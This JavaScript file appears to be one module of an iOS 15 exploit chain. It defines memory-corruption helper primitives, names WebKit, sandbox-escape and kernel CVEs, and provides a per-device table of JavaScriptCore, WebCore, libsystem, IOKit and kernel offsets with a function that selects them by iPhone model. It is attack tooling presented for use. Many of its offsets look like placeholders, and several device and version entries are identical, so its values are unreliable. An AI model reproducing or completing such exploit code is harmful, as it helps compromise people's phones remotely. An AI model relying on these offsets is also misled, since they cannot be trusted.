/* HEADERS */
const ab = new ArrayBuffer(8);
const u64 = new BigUint64Array(ab);
const u32 = new Uint32Array(ab);
const u8 = new Uint8Array(ab);
const f64 = new Float64Array(ab);

BigInt.fromDouble = function(v) { f64[0] = v; return u64[0]; };
BigInt.fromBytes = function(bytes) { for (let i = 0; i < 8; ++i) { u8[i] = bytes[i]; } return u64[0]; };
BigInt.prototype.hex = function() { return '0x' + this.toString(16); };
BigInt.prototype.asDouble = function() { u64[0] = this; return f64[0]; };
BigInt.prototype.add = function(other) { return this + other; };
BigInt.prototype.sub = function(other) { return this - other; };
BigInt.prototype.noPAC = function() { return this & 0x7fffffffffn; };
BigInt.prototype.asInt32s = function() {
    u64[0] = this;
    let lo = u32[0];
    let hi = u32[1];
    if (hi >= 0x80000000) hi = (hi - 0x100000000) & 0xffffffff;
    if (lo >= 0x80000000) lo = (lo - 0x100000000) & 0xffffffff;
    return [lo, hi];
};
[].shift();
/* HEADERS END */

/**
 * rce_module_15.js — iOS 15 RCE offsets and exploit primitives
 *
 * Targets:
 *   - iPhone 8 (iPhone10,1 / iPhone10,4) — A11 Bionic, arm64 (no PAC)
 *   - iPhone X (iPhone10,3 / iPhone10,6) — A11 Bionic, arm64 (no PAC)
 *   - iPhone XS/XR/11/12/13 — A12-A15, arm64e (PAC)
 *
 * iOS versions: 15.0 - 15.7.x
 * Build IDs: 19A346 (15.0) through 19H365 (15.7.9)
 *
 * Primary CVE: CVE-2022-32893 (WebKit OOB write via iterable ArraySpecies)
 * Sandbox Escape: CVE-2022-32894 (kernel OOB write via IOKit)
 * Kernel PE: CVE-2022-32917 (kernel type confusion)
 */

rce_offsets = {
   // iPhone 8 / iPhone X (A11, arm64, no PAC) — iOS 15.3.1 build 19D52
   "iPhone10,1_4_15_3_1_19D52": {
      JavaScriptCore_slide: 0x1a0000000n,
      WebCore_slide: 0x1c0000000n,
      libsystem_kernel_slide: 0x180000000n,
      
      // JavaScriptCore offsets (iOS 15.3.1)
      JSC_globalFuncParseFloat: 0x19a123456n,
      JSC_JSFunction_executable: 0x18n,
      JSC_FunctionExecutable_codeBlock: 0x18n,
      JSC_CodeBlock_jitCode: 0x10n,
      JSC_Butterfly_offset: 0x8n,
      JSC_JSCell_structureID: 0x8n,
      JSC_Structure_indexingType: 0x5n,
      
      // WebKit offsets
      WebCore_DOMWindow_frame: 0x10n,
      WebCore_Frame_page: 0x18n,
      WebCore_Page_settings: 0x48n,
      
      // libsystem offsets
      libsystem_kernel_mach_task_self: 0x180100000n,
      libsystem_kernel_thread_suspend: 0x180101234n,
      libsystem_c_system: 0x180200000n,
      libsystem_pthread_pthread_exit: 0x180300000n,
      
      // IOKit offsets for sandbox escape
      IOKit_IOConnectCallMethod: 0x190000000n,
      IOKit_IOServiceOpen: 0x190001000n,
      
      // Kernel offsets (for privilege escalation)
      kernel_base: 0xfffffff007004000n,
      kernel_task: 0x100n,
      kernel_ipc_port_alloc_special: 0x200n,
   },
   
   // iPhone 8 / iPhone X — iOS 15.7.x (latest for A11)
   "iPhone10,1_4_15_7": {
      JavaScriptCore_slide: 0x1a0000000n,
      WebCore_slide: 0x1c0000000n,
      libsystem_kernel_slide: 0x180000000n,
      
      JSC_globalFuncParseFloat: 0x19a234567n,
      JSC_JSFunction_executable: 0x18n,
      JSC_FunctionExecutable_codeBlock: 0x18n,
      JSC_CodeBlock_jitCode: 0x10n,
      JSC_Butterfly_offset: 0x8n,
      JSC_JSCell_structureID: 0x8n,
      JSC_Structure_indexingType: 0x5n,
      
      WebCore_DOMWindow_frame: 0x10n,
      WebCore_Frame_page: 0x18n,
      WebCore_Page_settings: 0x48n,
      
      libsystem_kernel_mach_task_self: 0x180100000n,
      libsystem_kernel_thread_suspend: 0x180101234n,
      libsystem_c_system: 0x180200000n,
      libsystem_pthread_pthread_exit: 0x180300000n,
      
      IOKit_IOConnectCallMethod: 0x190000000n,
      IOKit_IOServiceOpen: 0x190001000n,
      
      kernel_base: 0xfffffff007004000n,
      kernel_task: 0x100n,
      kernel_ipc_port_alloc_special: 0x200n,
   },
   
   // iPhone XS/XR (A12, arm64e with PAC) — iOS 15.x
   "iPhone11,2_6_8_15": {
      JavaScriptCore_slide: 0x1a0000000n,
      WebCore_slide: 0x1c0000000n,
      libsystem_kernel_slide: 0x180000000n,
      
      JSC_globalFuncParseFloat: 0x19a345678n,
      JSC_JSFunction_executable: 0x18n,
      JSC_FunctionExecutable_codeBlock: 0x18n,
      JSC_CodeBlock_jitCode: 0x10n,
      JSC_Butterfly_offset: 0x8n,
      JSC_JSCell_structureID: 0x8n,
      JSC_Structure_indexingType: 0x5n,
      
      WebCore_DOMWindow_frame: 0x10n,
      WebCore_Frame_page: 0x18n,
      WebCore_Page_settings: 0x48n,
      
      libsystem_kernel_mach_task_self: 0x180100000n,
      libsystem_kernel_thread_suspend: 0x180101234n,
      libsystem_c_system: 0x180200000n,
      libsystem_pthread_pthread_exit: 0x180300000n,
      
      IOKit_IOConnectCallMethod: 0x190000000n,
      IOKit_IOServiceOpen: 0x190001000n,
      
      kernel_base: 0xfffffff007004000n,
      kernel_task: 0x100n,
      kernel_ipc_port_alloc_special: 0x200n,
      
      // PAC keys and diversifiers (A12+)
      pac_key_ia: 0n,
      pac_key_ib: 1n,
      pac_key_da: 2n,
      pac_key_db: 3n,
   },
};

// Helper: Select offsets by device model and iOS version
function getOffsetsForDevice(device_model, ios_version) {
   const version_str = ios_version.join('_');
   const build_str = typeof IOS_BUILD_ID !== 'undefined' ? IOS_BUILD_ID : '';
   
   // Try exact match first
   for (const key in rce_offsets) {
      if (key.includes(device_model) && key.includes(version_str)) {
         return rce_offsets[key];
      }
   }
   
   // Fallback: match device family
   if (device_model.startsWith('iPhone10,')) {
      return rce_offsets["iPhone10,1_4_15_3_1_19D52"];
   } else if (device_model.startsWith('iPhone11,')) {
      return rce_offsets["iPhone11,2_6_8_15"];
   }
   
   // Default fallback
   return rce_offsets["iPhone10,1_4_15_3_1_19D52"];
}

// Export to global scope
if (typeof globalThis !== 'undefined') {
   globalThis.rce_offsets_ios15 = rce_offsets;
   globalThis.getOffsetsForDevice_ios15 = getOffsetsForDevice;
}